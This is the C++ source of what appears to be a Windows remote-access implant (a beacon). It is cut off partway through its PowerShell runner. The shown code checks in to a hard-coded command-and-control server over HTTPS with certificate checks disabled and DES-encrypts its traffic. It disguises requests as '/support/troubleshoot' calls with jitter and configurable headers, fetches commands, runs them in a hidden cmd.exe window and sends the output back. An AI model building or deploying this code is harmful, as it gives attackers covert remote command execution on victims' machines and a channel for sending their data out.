// x86_64-w64-mingw32-g++ -o HTTPS_DES.exe HTTPS_DES.cpp -lwininet -lcrypt32 -lws2_32 -static -std=c++17 -lstdc++fs

#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <random>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <ctime>
#include <algorithm>
#include <cstring>
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <filesystem>
#include <iomanip>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")

using namespace std;

const string AUTH_ID = "fbb9ef4d-915b-419f-8906-06815f7e5372";
const string SERVER_HOST = "192.168.1.107";
const int SERVER_PORT = 1111;
const string KEY = "12345678";
const string DEFAULT_USER_AGENT = "Mozilla/5.0";
bool VERIFY_SSL = false;

namespace tiny_des {

    static const int IP[64] = {
        58, 50, 42, 34, 26, 18, 10, 2,
        60, 52, 44, 36, 28, 20, 12, 4,
        62, 54, 46, 38, 30, 22, 14, 6,
        64, 56, 48, 40, 32, 24, 16, 8,
        57, 49, 41, 33, 25, 17, 9, 1,
        59, 51, 43, 35, 27, 19, 11, 3,
        61, 53, 45, 37, 29, 21, 13, 5,
        63, 55, 47, 39, 31, 23, 15, 7
    };

    static const int FP[64] = {
        40, 8, 48, 16, 56, 24, 64, 32,
        39, 7, 47, 15, 55, 23, 63, 31,
        38, 6, 46, 14, 54, 22, 62, 30,
        37, 5, 45, 13, 53, 21, 61, 29,
        36, 4, 44, 12, 52, 20, 60, 28,
        35, 3, 43, 11, 51, 19, 59, 27,
        34, 2, 42, 10, 50, 18, 58, 26,
        33, 1, 41, 9, 49, 17, 57, 25
    };

    static const int E[48] = {
        32, 1, 2, 3, 4, 5,
        4, 5, 6, 7, 8, 9,
        8, 9, 10, 11, 12, 13,
        12, 13, 14, 15, 16, 17,
        16, 17, 18, 19, 20, 21,
        20, 21, 22, 23, 24, 25,
        24, 25, 26, 27, 28, 29,
        28, 29, 30, 31, 32, 1
    };

    static const int P[32] = {
        16, 7, 20, 21,
        29, 12, 28, 17,
        1, 15, 23, 26,
        5, 18, 31, 10,
        2, 8, 24, 14,
        32, 27, 3, 9,
        19, 13, 30, 6,
        22, 11, 4, 25
    };

    static const int PC1[56] = {
        57, 49, 41, 33, 25, 17, 9,
        1, 58, 50, 42, 34, 26, 18,
        10, 2, 59, 51, 43, 35, 27,
        19, 11, 3, 60, 52, 44, 36,
        63, 55, 47, 39, 31, 23, 15,
        7, 62, 54, 46, 38, 30, 22,
        14, 6, 61, 53, 45, 37, 29,
        21, 13, 5, 28, 20, 12, 4
    };

    static const int PC2[48] = {
        14, 17, 11, 24, 1, 5,
        3, 28, 15, 6, 21, 10,
        23, 19, 12, 4, 26, 8,
        16, 7, 27, 20, 13, 2,
        41, 52, 31, 37, 47, 55,
        30, 40, 51, 45, 33, 48,
        44, 49, 39, 56, 34, 53,
        46, 42, 50, 36, 29, 32
    };

    static const int SHIFTS[16] = { 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 };

    static const int SBOX[8][4][16] = {
        {
            {14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7},
            {0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8},
            {4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0},
            {15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13}
        },
        {
            {15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10},
            {3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5},
            {0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15},
            {13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9}
        },
        {
            {10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8},
            {13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1},
            {13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7},
            {1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12}
        },
        {
            {7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15},
            {13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9},
            {10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4},
            {3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14}
        },
        {
            {2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9},
            {14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6},
            {4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14},
            {11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3}
        },
        {
            {12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11},
            {10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8},
            {9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6},
            {4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13}
        },
        {
            {4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1},
            {13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6},
            {1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2},
            {6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12}
        },
        {
            {13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7},
            {1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2},
            {7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8},
            {2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11}
        }
    };

    static uint64_t permute(uint64_t input, const int* table, int n, int input_bits) {
        uint64_t output = 0;
        for (int i = 0; i < n; ++i) {
            output <<= 1;
            output |= (input >> (input_bits - table[i])) & 1ULL;
        }
        return output;
    }

    static uint32_t permute32(uint32_t input, const int* table, int n, int input_bits) {
        uint32_t output = 0;
        for (int i = 0; i < n; ++i) {
            output <<= 1;
            output |= (input >> (input_bits - table[i])) & 1U;
        }
        return output;
    }

    static void generate_subkeys(const uint8_t* key, uint64_t subkeys[16]) {
        uint64_t key64 = 0;
        for (int i = 0; i < 8; ++i) {
            key64 = (key64 << 8) | key[i];
        }

        uint64_t pc1 = permute(key64, PC1, 56, 64);
        uint32_t c = (uint32_t)((pc1 >> 28) & 0x0FFFFFFF);
        uint32_t d = (uint32_t)(pc1 & 0x0FFFFFFF);

        for (int i = 0; i < 16; ++i) {
            int shift = SHIFTS[i];
            c = ((c << shift) | (c >> (28 - shift))) & 0x0FFFFFFF;
            d = ((d << shift) | (d >> (28 - shift))) & 0x0FFFFFFF;

            uint64_t cd = ((uint64_t)c << 28) | d;
            subkeys[i] = permute(cd, PC2, 48, 56);
        }
    }

    static uint32_t feistel(uint32_t r, uint64_t subkey) {
        uint64_t expanded = 0;
        for (int i = 0; i < 48; ++i) {
            expanded <<= 1;
            expanded |= (r >> (32 - E[i])) & 1ULL;
        }

        uint64_t x = expanded ^ subkey;
        uint32_t s_out = 0;

        for (int i = 0; i < 8; ++i) {
            int chunk = (int)((x >> (42 - i * 6)) & 0x3F);
            int row = ((chunk & 0x20) >> 4) | (chunk & 1);
            int col = (chunk >> 1) & 0x0F;
            s_out = (s_out << 4) | SBOX[i][row][col];
        }

        return permute32(s_out, P, 32, 32);
    }

    static uint64_t des_block_encrypt(uint64_t block, const uint64_t subkeys[16]) {
        uint64_t ip = permute(block, IP, 64, 64);
        uint32_t l = (uint32_t)(ip >> 32);
        uint32_t r = (uint32_t)(ip & 0xFFFFFFFFULL);

        for (int i = 0; i < 16; ++i) {
            uint32_t temp = l;
            l = r;
            r = temp ^ feistel(r, subkeys[i]);
        }

        uint64_t preoutput = ((uint64_t)r << 32) | l;
        return permute(preoutput, FP, 64, 64);
    }

    static uint64_t des_block_decrypt(uint64_t block, const uint64_t subkeys[16]) {
        uint64_t ip = permute(block, IP, 64, 64);
        uint32_t l = (uint32_t)(ip >> 32);
        uint32_t r = (uint32_t)(ip & 0xFFFFFFFFULL);

        for (int i = 15; i >= 0; --i) {
            uint32_t temp = l;
            l = r;
            r = temp ^ feistel(r, subkeys[i]);
        }

        uint64_t preoutput = ((uint64_t)r << 32) | l;
        return permute(preoutput, FP, 64, 64);
    }

    static void des_cbc_encrypt(const uint8_t* key, const uint8_t* iv,
                                const uint8_t* in, uint8_t* out, size_t len) {
        uint64_t subkeys[16];
        generate_subkeys(key, subkeys);

        uint8_t prev[8];
        memcpy(prev, iv, 8);

        for (size_t i = 0; i < len; i += 8) {
            uint64_t block = 0;
            for (int j = 0; j < 8; ++j) {
                uint8_t b = in[i + j] ^ prev[j];
                block = (block << 8) | b;
            }
            uint64_t enc = des_block_encrypt(block, subkeys);
            for (int j = 0; j < 8; ++j) {
                out[i + j] = (uint8_t)(enc >> (56 - j * 8));
            }
            memcpy(prev, out + i, 8);
        }
    }

    static void des_cbc_decrypt(const uint8_t* key, const uint8_t* iv,
                                const uint8_t* in, uint8_t* out, size_t len) {
        uint64_t subkeys[16];
        generate_subkeys(key, subkeys);

        uint8_t prev[8];
        memcpy(prev, iv, 8);

        for (size_t i = 0; i < len; i += 8) {
            uint64_t block = 0;
            for (int j = 0; j < 8; ++j) {
                block = (block << 8) | in[i + j];
            }
            uint64_t dec = des_block_decrypt(block, subkeys);
            for (int j = 0; j < 8; ++j) {
                out[i + j] = (uint8_t)(dec >> (56 - j * 8)) ^ prev[j];
            }
            memcpy(prev, in + i, 8);
        }
    }
}

string base64_encode(const string& input) {
    if (input.empty()) return "";
    DWORD encodedSize = 0;
    CryptBinaryToStringA((const BYTE*)input.c_str(), (DWORD)input.length(),
                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedSize);
    if (encodedSize == 0) return "";
    vector<char> encoded(encodedSize);
    if (!CryptBinaryToStringA((const BYTE*)input.c_str(), (DWORD)input.length(),
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded.data(), &encodedSize)) {
        return "";
    }
    return string(encoded.data());
}

string base64_decode(const string& input) {
    if (input.empty()) return "";
    string s = input;
    size_t missing = s.length() % 4;
    if (missing) s += string(4 - missing, '=');

    DWORD decodedSize = 0;
    CryptStringToBinaryA(s.c_str(), (DWORD)s.length(), CRYPT_STRING_BASE64,
                         NULL, &decodedSize, NULL, NULL);
    if (decodedSize == 0) return "";
    vector<BYTE> decoded(decodedSize);
    if (!CryptStringToBinaryA(s.c_str(), (DWORD)s.length(), CRYPT_STRING_BASE64,
                              decoded.data(), &decodedSize, NULL, NULL)) {
        return "";
    }
    return string((char*)decoded.data(), decodedSize);
}

string url_encode(const string& s) {
    string result;
    result.reserve(s.size() * 3);
    for (unsigned char c : s) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            result += (char)c;
        } else {
            char buf[8];
            snprintf(buf, sizeof(buf), "%%%02X", c);
            result += buf;
        }
    }
    return result;
}

class DESCipher {
private:
    vector<unsigned char> key;
    static const int block_size = 8;

    vector<unsigned char> pad(const vector<unsigned char>& data) {
        size_t padding_length = block_size - (data.size() % block_size);
        vector<unsigned char> padded = data;
        padded.insert(padded.end(), padding_length, static_cast<unsigned char>(padding_length));
        return padded;
    }

    vector<unsigned char> unpad(const vector<unsigned char>& data) {
        if (data.empty()) return data;
        size_t padding_length = data.back();
        if (padding_length == 0 || padding_length > block_size) return data;
        return vector<unsigned char>(data.begin(), data.end() - padding_length);
    }

public:
    DESCipher(const string& key_str) {
        key = vector<unsigned char>(key_str.begin(), key_str.end());
        if (key.size() != 8) {
            while (key.size() < 8) key.push_back('0');
            key.resize(8);
        }
    }

    string encrypt(const string& raw) {
        vector<unsigned char> raw_bytes(raw.begin(), raw.end());
        raw_bytes = pad(raw_bytes);

        unsigned char iv[8];
        HCRYPTPROV hProv = 0;
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            CryptGenRandom(hProv, 8, iv);
            CryptReleaseContext(hProv, 0);
        } else {
            for (int i = 0; i < 8; ++i) iv[i] = (unsigned char)(rand() % 256);
        }

        vector<unsigned char> ciphertext(raw_bytes.size());
        tiny_des::des_cbc_encrypt(key.data(), iv, raw_bytes.data(), ciphertext.data(), raw_bytes.size());

        vector<unsigned char> result;
        result.reserve(8 + ciphertext.size());
        result.insert(result.end(), iv, iv + 8);
        result.insert(result.end(), ciphertext.begin(), ciphertext.end());

        return base64_encode(string((char*)result.data(), result.size()));
    }

    string decrypt(const string& enc) {
        string decoded = base64_decode(enc);
        if (decoded.size() < 8) return "";

        vector<unsigned char> enc_bytes(decoded.begin(), decoded.end());
        unsigned char iv[8];
        memcpy(iv, enc_bytes.data(), 8);

        size_t ct_len = enc_bytes.size() - 8;
        if (ct_len == 0 || ct_len % 8 != 0) return "";

        vector<unsigned char> plaintext(ct_len);
        tiny_des::des_cbc_decrypt(key.data(), iv, enc_bytes.data() + 8, plaintext.data(), ct_len);
        plaintext = unpad(plaintext);

        return string(plaintext.begin(), plaintext.end());
    }
};

class Json {
private:
    enum Type { JSON_NULL, JSON_OBJECT, JSON_ARRAY, JSON_STRING, JSON_BOOL, JSON_NUMBER };
    Type type;
    map<string, Json> object_value;
    vector<Json> array_value;
    string string_value;
    bool bool_value;
    double number_value;

public:
    Json() : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(nullptr_t) : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(const string& s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(const char* s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(bool b) : type(JSON_BOOL), bool_value(b), number_value(0) {}
    Json(int n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}
    Json(double n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}
    Json(const map<string, Json>& obj) : type(JSON_OBJECT), object_value(obj), bool_value(false), number_value(0) {}

    static Json object() { Json j; j.type = JSON_OBJECT; return j; }
    static Json array() { Json j; j.type = JSON_ARRAY; return j; }

    Json& operator[](const string& key) {
        if (type != JSON_OBJECT) { type = JSON_OBJECT; object_value.clear(); }
        return object_value[key];
    }

    Json& operator[](size_t index) {
        if (type != JSON_ARRAY) { type = JSON_ARRAY; array_value.clear(); }
        if (index >= array_value.size()) array_value.resize(index + 1);
        return array_value[index];
    }

    void push_back(const Json& val) {
        if (type != JSON_ARRAY) { type = JSON_ARRAY; array_value.clear(); }
        array_value.push_back(val);
    }

    string dump(int indent = 0) const {
        if (type == JSON_NULL) return "null";
        if (type == JSON_BOOL) return bool_value ? "true" : "false";
        if (type == JSON_STRING) return "\"" + escape(string_value) + "\"";
        if (type == JSON_NUMBER) {
            char buf[64];
            if (number_value == (int)number_value) snprintf(buf, sizeof(buf), "%d", (int)number_value);
            else snprintf(buf, sizeof(buf), "%g", number_value);
            return string(buf);
        }
        if (type == JSON_ARRAY) {
            string result = "[";
            for (size_t i = 0; i < array_value.size(); i++) {
                if (i > 0) result += ",";
                if (indent >= 0) result += "\n" + string(indent + 2, ' ');
                result += array_value[i].dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !array_value.empty()) result += "\n" + string(indent, ' ');
            result += "]";
            return result;
        }
        if (type == JSON_OBJECT) {
            string result = "{";
            bool first = true;
            for (const auto& pair : object_value) {
                if (!first) result += ",";
                first = false;
                if (indent >= 0) result += "\n" + string(indent + 2, ' ');
                result += "\"" + escape(pair.first) + "\":" + (indent >= 0 ? " " : "");
                result += pair.second.dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !object_value.empty()) result += "\n" + string(indent, ' ');
            result += "}";
            return result;
        }
        return "null";
    }

private:
    static string escape(const string& s) {
        string result;
        for (char c : s) {
            if (c == '"') result += "\\\"";
            else if (c == '\\') result += "\\\\";
            else if (c == '\b') result += "\\b";
            else if (c == '\f') result += "\\f";
            else if (c == '\n') result += "\\n";
            else if (c == '\r') result += "\\r";
            else if (c == '\t') result += "\\t";
            else if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); result += buf; }
            else result += c;
        }
        return result;
    }
};

string session_id;
vector<string> uris = {"/support/troubleshoot"};
string current_user_agent = DEFAULT_USER_AGENT;
double sleep_time = 60.0;
int start_jitter = 0;
int end_jitter = 0;
string prepend_output = "";
string append_output = "";
map<string, string> get_client_headers;
map<string, string> post_client_headers;
DESCipher* des = nullptr;

string json_escape(const string& s) {
    string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '\"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

string random_choice(const vector<string>& vec) {
    if (vec.empty()) return "";
    static random_device rd;
    static mt19937 gen(rd());
    uniform_int_distribution<> dis(0, (int)vec.size() - 1);
    return vec[dis(gen)];
}

string get_url() {
    return "https://" + SERVER_HOST + ":" + to_string(SERVER_PORT) + random_choice(uris);
}

map<string, string> get_request_headers(bool is_post) {
    map<string, string> headers;
    headers["User-Agent"] = current_user_agent;
    if (is_post) {
        headers["Content-Type"] = "application/json";
        for (const auto& h : post_client_headers)
            if (!h.second.empty()) headers[h.first] = h.second;
    } else {
        for (const auto& h : get_client_headers)
            if (!h.second.empty()) headers[h.first] = h.second;
    }
    return headers;
}

string http_request(const string& url, const string& method, const string& data, const map<string, string>& headers) {
    string host = SERVER_HOST;
    int port = SERVER_PORT;
    string path = "/support/troubleshoot";

    size_t https_pos = url.find("https://");
    if (https_pos != string::npos) {
        string temp = url.substr(https_pos + 8);
        size_t slash_pos = temp.find('/');
        if (slash_pos != string::npos) {
            string host_part = temp.substr(0, slash_pos);
            size_t colon_pos = host_part.find(':');
            if (colon_pos != string::npos) {
                host = host_part.substr(0, colon_pos);
                port = stoi(host_part.substr(colon_pos + 1));
            } else {
                host = host_part;
                port = 443;
            }
            path = temp.substr(slash_pos);
        }
    }

    HINTERNET hInternet = InternetOpenA(current_user_agent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    DWORD flags = INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                  INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
                  INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
                  INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
                  INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_SECURE;

    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(), NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    if (!VERIFY_SSL) {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_WRONG_USAGE;
        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    string headers_str;
    for (const auto& h : headers)
        headers_str += h.first + ": " + h.second + "\r\n";
    if (method == "POST")
        headers_str += "Content-Length: " + to_string(data.length()) + "\r\n";
    headers_str += "\r\n";

    if (!HttpSendRequestA(hRequest, headers_str.c_str(), (DWORD)headers_str.length(),
                          (LPVOID)(method == "POST" ? data.c_str() : NULL),
                          method == "POST" ? (DWORD)data.length() : 0)) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusCodeSize, NULL);

    string response;
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return response;
}

string get_json_value(const string& json, const string& key) {
    string search = "\"" + key + "\":\"";
    size_t pos = json.find(search);
    if (pos == string::npos) {
        search = "\"" + key + "\":";
        pos = json.find(search);
        if (pos == string::npos) return "";
        pos += search.length();
        while (pos < json.length() && isspace((unsigned char)json[pos])) pos++;
        if (pos >= json.length()) return "";
        if (json[pos] == '"') {
            pos++;
            size_t end = json.find('"', pos);
            if (end == string::npos) return "";
            return json.substr(pos, end - pos);
        }
        size_t end = json.find_first_of(",}", pos);
        if (end == string::npos) end = json.length();
        return json.substr(pos, end - pos);
    }
    pos += search.length();
    size_t end = json.find('"', pos);
    if (end == string::npos) return "";
    return json.substr(pos, end - pos);
}

vector<string> get_json_array(const string& json, const string& key) {
    vector<string> result;
    string search = "\"" + key + "\":[";
    size_t pos = json.find(search);
    if (pos == string::npos) return result;
    pos += search.length();
    size_t end = json.find(']', pos);
    if (end == string::npos) return result;

    string arr = json.substr(pos, end - pos);
    size_t start = 0;
    while ((start = arr.find('\"', start)) != string::npos) {
        start++;
        size_t end_quote = arr.find('\"', start);
        if (end_quote == string::npos) break;
        result.push_back(arr.substr(start, end_quote - start));
        start = end_quote + 1;
    }
    return result;
}

void apply_jitter() {
    if (start_jitter > end_jitter) swap(start_jitter, end_jitter);
    static random_device rd;
    static mt19937 gen(rd());
    uniform_int_distribution<> dis(start_jitter, end_jitter);
    int jitter_amount = dis(gen);
    double final_sleep = sleep_time + jitter_amount;
    final_sleep = max(10.0, min(900.0, final_sleep));
    this_thread::sleep_for(chrono::milliseconds((int)(final_sleep * 1000)));
}

bool checkin() {
    try {
        string encrypted_id = des->encrypt(AUTH_ID);

        string payload = "{\"action\":\"checkin\",\"token\":\"" + json_escape(encrypted_id) + "\"}";

        string response = http_request(get_url(), "POST", payload, get_request_headers(true));
        if (response.empty()) return false;

        if (response.find("\"sid\"") == string::npos) return false;

        string sid_enc = get_json_value(response, "sid");
        if (sid_enc.empty()) return false;

        session_id = des->decrypt(sid_enc);
        if (session_id.empty()) return false;

        string ua_enc = get_json_value(response, "ua");
        if (!ua_enc.empty()) {
            string ua = des->decrypt(ua_enc);
            if (!ua.empty()) current_user_agent = ua;
        }

        string sj_enc = get_json_value(response, "sj");
        if (!sj_enc.empty()) {
            string sj = des->decrypt(sj_enc);
            if (!sj.empty()) start_jitter = stoi(sj);
        }

        string ej_enc = get_json_value(response, "ej");
        if (!ej_enc.empty()) {
            string ej = des->decrypt(ej_enc);
            if (!ej.empty()) end_jitter = stoi(ej);
        }

        string sl_enc = get_json_value(response, "sl");
        if (!sl_enc.empty()) {
            string sl = des->decrypt(sl_enc);
            if (!sl.empty()) sleep_time = stod(sl);
        }

        vector<string> uris_enc = get_json_array(response, "ur");
        if (!uris_enc.empty()) {
            vector<string> new_uris;
            for (const auto& u : uris_enc) {
                string dec = des->decrypt(u);
                if (!dec.empty()) new_uris.push_back(dec);
            }
            if (!new_uris.empty()) uris = new_uris;
        }

        string pre_enc = get_json_value(response, "pre");
        if (!pre_enc.empty()) prepend_output = des->decrypt(pre_enc);

        string app_enc = get_json_value(response, "app");
        if (!app_enc.empty()) append_output = des->decrypt(app_enc);

        string gh_enc = get_json_value(response, "gh");
        get_client_headers.clear();
        if (!gh_enc.empty()) {
            string gh = des->decrypt(gh_enc);
            if (!gh.empty()) {
                istringstream iss(gh);
                string line;
                while (getline(iss, line)) {
                    size_t c = line.find(':');
                    if (c != string::npos) {
                        string k = line.substr(0, c);
                        string v = line.substr(c + 1);
                        size_t ks = k.find_first_not_of(" \t");
                        if (ks == string::npos) continue;
                        size_t ke = k.find_last_not_of(" \t");
                        k = k.substr(ks, ke - ks + 1);
                        size_t vs = v.find_first_not_of(" \t");
                        if (vs != string::npos) {
                            size_t ve = v.find_last_not_of(" \t");
                            v = v.substr(vs, ve - vs + 1);
                        } else v = "";
                        get_client_headers[k] = v;
                    }
                }
            }
        }

        string ph_enc = get_json_value(response, "ph");
        post_client_headers.clear();
        if (!ph_enc.empty()) {
            string ph = des->decrypt(ph_enc);
            if (!ph.empty()) {
                istringstream iss(ph);
                string line;
                while (getline(iss, line)) {
                    size_t c = line.find(':');
                    if (c != string::npos) {
                        string k = line.substr(0, c);
                        string v = line.substr(c + 1);
                        size_t ks = k.find_first_not_of(" \t");
                        if (ks == string::npos) continue;
                        size_t ke = k.find_last_not_of(" \t");
                        k = k.substr(ks, ke - ks + 1);
                        size_t vs = v.find_first_not_of(" \t");
                        if (vs != string::npos) {
                            size_t ve = v.find_last_not_of(" \t");
                            v = v.substr(vs, ve - vs + 1);
                        } else v = "";
                        post_client_headers[k] = v;
                    }
                }
            }
        }

        return true;
    }
    catch (exception& e) {
        return false;
    }
}

string get_tasks() {
    if (session_id.empty()) return "";

    try {
        string encrypted_sid = des->encrypt(session_id);
        string encoded_sid = url_encode(encrypted_sid);

        string url = "https://" + SERVER_HOST + ":" + to_string(SERVER_PORT) +
                     random_choice(uris) + "?session_id=" + encoded_sid;

        string response = http_request(url, "GET", "", get_request_headers(false));
        if (response.empty()) return "";

        string cmd_enc = get_json_value(response, "command");
        if (cmd_enc.empty()) return "";

        string cmd = des->decrypt(cmd_enc);
        size_t s = cmd.find_first_not_of(" \t\r\n");
        if (s == string::npos) return "";
        size_t e = cmd.find_last_not_of(" \t\r\n");
        return cmd.substr(s, e - s + 1);
    }
    catch (exception& e) {
        return "";
    }
}

void submit_output(const string& output) {
    if (session_id.empty()) return;

    try {
        string encrypted = des->encrypt(output);
        string final_output = prepend_output + encrypted + append_output;

        string sid_enc = des->encrypt(session_id);

        string payload = "{\"action\":\"submit\",\"sid\":\"" + json_escape(sid_enc) +
                         "\",\"out\":\"" + json_escape(final_output) + "\"}";

        http_request(get_url(), "POST", payload, get_request_headers(true));
    }
    catch (exception& e) {
    }
}

string run_cmd_command(const string& cmd) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    string full_cmd = "cmd.exe /c " + cmd;
    vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] CMD execution error: " + to_string(error);
    }

    string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + to_string(exitCode) + "]";
    return output.empty() ? "[+] Command executed (no output)" : output;
}

string run_powershell_command(const string& ps_cmd) {
    string escaped_cmd;
    for (char c : ps_cmd) {
        if (c == '"') escaped_cmd += "\\\"";
        else escaped_cmd += c;
    }

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

